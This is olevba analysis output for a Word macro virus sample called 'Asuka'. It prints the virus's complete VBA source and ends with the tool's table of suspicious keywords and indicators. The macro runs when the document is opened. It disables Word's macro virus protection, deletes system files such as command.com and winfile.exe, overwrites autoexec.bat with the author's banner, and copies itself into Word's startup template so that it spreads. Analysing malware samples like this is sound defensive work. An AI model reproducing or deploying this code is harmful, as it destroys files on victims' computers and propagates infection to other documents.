olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asuka-3cb881a072a20f5882f5ad08e06284c3758209a2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asuka-3cb881a072a20f5882f5ad08e06284c3758209a2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Asuka-3cb881a072a20f5882f5ad08e06284c3758209a2 - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub AutoOpen()
On Error GoTo RutinaDeError
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
ShowVisualBasicEditor = False
Dim DirName As String
Dim Shinji As String
    DirName = Donde_esta_Windows()
    Shinji = DirName
Kill (Shinji + "winfile.exe")
Kill (Shinji + "command.com")
Kill (Shinji + "SYSTEM\APPWIZ.cpl")
Open "c:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "ECHO          *********************************************************"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ViRuS: ASUKA  ANTI - T               *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                         AUTOR:                        *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ©©©© DarK OmEGA  ©©©©                *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                      LIMA - PERU                      *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                       16/FEB/00                       *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                     ®®®®®®®®®®®®®®                    *"
Print #1, "ECHO          *                     §            §                    *"
Print #1, "ECHO          *                     §   A.B.G    §                    *"
Print #1, "ECHO          *********************************************************"
Print #1, "pause"
Close #1
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
RutinaDeError:
Exit Sub
End Sub

Function Donde_esta_Windows() As String
    Dim Temp As String
    Dim Ret As Long
    Const MAX_LENGTH = 145

    Temp = String$(MAX_LENGTH, 0)
    Ret = Donde_esta_Windowsdirectory(Temp, MAX_LENGTH)
    Temp = Left$(Temp, Ret)
    If Temp <> "" And Right$(Temp, 1) <> "\" Then
        Donde_esta_Windows = Temp & "\"
    Else
        Donde_esta_Windows = Temp
    End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winfile.exe         |Executable file name                         |
|IOC       |APPWIZ.cpl          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

